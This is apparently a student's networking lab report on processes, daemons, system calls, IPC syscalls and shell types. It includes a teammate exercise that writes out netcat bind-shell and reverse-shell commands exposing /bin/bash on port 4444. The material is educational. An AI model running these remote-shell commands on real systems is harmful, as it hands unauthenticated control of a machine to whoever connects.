# CSN. Lab 3. Technological Communication

# Done by Fedorov Alexey

---

# Task 1

```
1.a. Define the following briefly:
Process
Daemon
System call
Client & Server
Peer to Peer
1.b. List and briefly explain the different types of Unix system calls for IPC.
1.c. Explain for at least 2 kernel architectures, how IPC is handled.
```

## 1.a

### Process

**Process** - is a runtime environment for running an instance of a program. For example, there is some program and when it is launched, a process is created for it. This process is endowed with certain properties, a portion of RAM is allocated to it and a unique identifier is assigned.

Structure of process depends on operating system. Let's discuss linux procesess.

Process has several states, you can see them on Figure 1.

![Figure 1](https://github.com/user-attachments/assets/e1db8b12-94c5-47c7-8851-745f9fc0c72f)

- **R (running)** - The process is being processed by the processor.
- **R (runnable)** - The process is ready for processing and is in the queue to the processor. Running and runnable are denoted by the same letter R.
- **D (uninterruptible sleep)** When a process accesses a device, such as a disk or network card, it goes into this state. 
- **I (Idle)** - The state is similar to D, but such processes do not load the processor and are excluded from the calculation of the average system load (load average).
- **S (sleeping)** - The process is waiting for some resources that are currently unavailable.
- **T (stopped by job control signal)** - We'll talk about signals later, but the main thing to understand is that processes can process signals, and one of them can stop the process.
- **Z (zombie)** - When a process completes its work, it frees up its resources, but does not free up its PID in the process table. 

Every process starts with **fork()** system call that creates copy of process. Then the process configured via **exec()** system call.

![Figure 2](https://github.com/user-attachments/assets/c886b5c9-b998-4f3f-8448-3d38f74ada63)

Morover you can control processes with a several tools:

- **kill** - interrupts process. Have different signal to control process behavior.
- **bg**, **fg**, **jobs** - allow you to manage processes running in the foreground and background.
- **ps** - shows process list.

### Daemon

![Figure 3](https://github.com/user-attachments/assets/92c790bb-fb87-4940-9b0c-f2536a069c6f)


**Daemon** is a background process that runs long time. Usually it is service that controls something or server. Daemon examples are

- **Nginx** - proxy engine for L7 routing. Runs as daemon is background and awaits requests.
- **Bluetoothd** - bluetooth daemon, controls bluetooth workflow.

Daemons usually have some provisor that controls their behavior. There are two popular provisor for linux:

- **Systemd** - actually it is linux initialization system, but it also provides functionality for services provision(systemd units).
- **Docker** - containerization system that used to run server applications. It used to run deamons. 

### System call

![Figure 4](https://github.com/user-attachments/assets/9b6dd4a0-f5e0-4b36-96bf-7a4d4284f001)


**System call** - is function that handles communication with operating system kernel. Every operating system has it's own system calls. There are libraries to use system calls in programming languages. Basically you can call them in asssembly code.

System calls example:
- **fork()**(linux) or **CreateProcess()**(windows) - Create a new process.
- **read()**(linux) or **ReadFile()**(windows) - Read data from a file or input device.

Assembly system call example:

![Figure 5](https://github.com/user-attachments/assets/cca69941-2748-4e99-b5ad-77736f80a521)

### Client-Server

![Figure 6](https://github.com/user-attachments/assets/ad38d9f1-2394-463d-a097-1e38ec7ad69b)

**Client-Server** - is a software architecture where 2 sides - Server and Client. Server usually contains business logic that implements service or application behavior. Client is interface for user to interact with server.  

Client-server examples:

**Any website** - browser is client side, interface to interact with server. Browser sends requests to server, server returns reponse to browser.

I Don't want write too much because this topic was discussed 100 times.

### Peer-to-Peer

![image](https://github.com/user-attachments/assets/e3f8cd24-f75f-44d6-a139-d7d254aed699)

**Peer-to-Peer** - is software architecture that describes distibuted network of eqully privileged peers. Peer is one computer, user. 

Examples of P2P:

- **BitTorrent** -  peer-to-peer network protocol for cooperative file sharing over the Internet.
- **MAC Addressing** - equal privileged networking addressing via device's MAC address.

## 1.b

### Pipelines


|Syscall |	Number	|Description |
|---|---|---|
|PIPE	| 22 |	Create pipe |
|PIPE2 |	293	| Create pipe|
|TEE |	276	| Duplicate pipe content|
|SPLICE	| 275	| Splice data to/from a pipe|
|VMSPLICE	| 278	| Splice user pages into a pipe|

### Shared Memory

| Syscall |	Number | 	Description|
|---|---|---|
| SHMGET |	29 |	Allocates a System V shared memory segment |
|SHMCTL	| 31	|System V shared memory control |
|SHMAT	| 30	|Attach the System V shared memory segment to the address space of the calling process |
|SHMDT	| 67	|Dettach the System V shared memory segment to the address space of the calling process |

## 1.c



# Task 2

```
2.a. Define the various methods for Inter Process communication and provide
advantages and disadvantages respectively.
2.b. What IPC facilities are currently on your system? Show the current activity in them.
2.c. Create two separate programs which implements inter process communication
(between parent process and child process) using shared memory and pipes, using any
programming language of your choice.
```

# Task 3

```
This task will be done in a team of 2.
3.a. Define the following:
bind shell [ use nc, & powershell to show a practical example with your teammate]
reverse shell [ use nc, ncat, socat, powershell & powercat to show a practical example
with your teammate]
3.b. List and give short explanations on the shell types in linux.
3.c. What is netcat’s gaping security hole? Recreate and explain it.
```
  
## 3.a

Let's consider a few scenarios:

### Bind shell

![image](https://github.com/user-attachments/assets/ab52926e-35d2-46b9-b85a-0e0488610b76)

In our first scenario, Joel reached out to Lesha for help and asked him to connect to his computer and execute some commands remotely. Joel has a public IP address and is directly connected to the internet. Lesha, however, is behind a NAT and has an internal IP address. Joel needs to bind bash to a TCP port on his public IP address and ask Lesha to connect to his specific IP address and port. Joel will run Netcat with the -e parameter to execute bash:

```sh
nc -nlvp 4444 -e /bin/bash
```

Now, Netcat has bound TCP port 4444 to bash and will redirect any input, output, or error messages from bash over the network. In other words, anyone connecting to TCP port 4444 on Joel’s machine (hopefully Lesha) will see Joel's command prompt. This is truly a "gaping security hole"!

```
nc -nv 192.168.0.178 4444
```

![Joel's computer](https://github.com/user-attachments/assets/51ebbfbd-be39-450e-845f-e9bbc87865dd)
![Lesha's computer](https://github.com/user-attachments/assets/eb20ab08-5567-4615-aee3-adeb7f6a67ce)

### Reverse shell

![image](https://github.com/user-attachments/assets/7ee3dc39-0d78-4d32-8542-4c74cc815828)

In our second scenario, Lesha needs Joel's help. Here, we can use another useful feature of Netcat — the ability to send commands to a host that is listening on a specific port. In this situation, Lesha cannot (as per the scenario) bind port 4444 for /bin/bash locally (bind shell) on his computer and wait for Joel to connect, but she can transfer control of his bash to Joel's computer. This is called a reverse shell. For this to work, Joel will first set up Netcat to listen. In our example, we'll use port 4444:

```
nc -nlvp 4444
```

Now, Lesha can send Joel a reverse shell from his Linux machine. Again, we use the `-e` option to make an application available remotely, which in this case is `/bin/bash`, the Linux shell:

```
nc -nv 192.168.0.178 4444 -e /bin/bash
```

![Joel's computer](https://github.com/user-attachments/assets/838943c7-c3b7-4b4c-b00f-d8c89aa85767)
![Lesha's computer](https://github.com/user-attachments/assets/84aced40-3aeb-4d9a-a176-45579d37d8e3)


## 3.b

Shell in linux is terminal commands interpreter. The following shells are most popular for nowadays:

Here's a compact comparison of **Bash**, **sh**, **fish**, **zsh**, and **csh**:

| **Shell**  | **Description**                         | **Key Features**                                                             | **Use Cases**                                  |
|------------|-----------------------------------------|------------------------------------------------------------------------------|------------------------------------------------|
| **Bash**   | Default Linux shell, POSIX-compliant    | Command history, scripting, job control, programmable completion              | Standard shell scripting, interactive use      |
| **sh**     | Original Unix shell (Bourne Shell)      | Lightweight, minimal scripting, POSIX-compliant, no advanced features         | Basic shell scripting, legacy systems          |
| **fish**   | User-friendly, modern shell             | Autosuggestions, syntax highlighting, simple configuration                    | Interactive shell for beginners and developers |
| **zsh**    | Feature-rich, highly customizable       | Plugin support (Oh My Zsh), auto-completion, themes, improved scripting       | Power users, custom workflows                  |
| **csh**    | C-like syntax, historical Unix shell    | Aliases, job control, limited scripting compared to Bash                      | Older Unix systems, specific legacy workflows  |

## 3.c

Netcat has a gaping security hole. It is possible to open network connections without authentication.

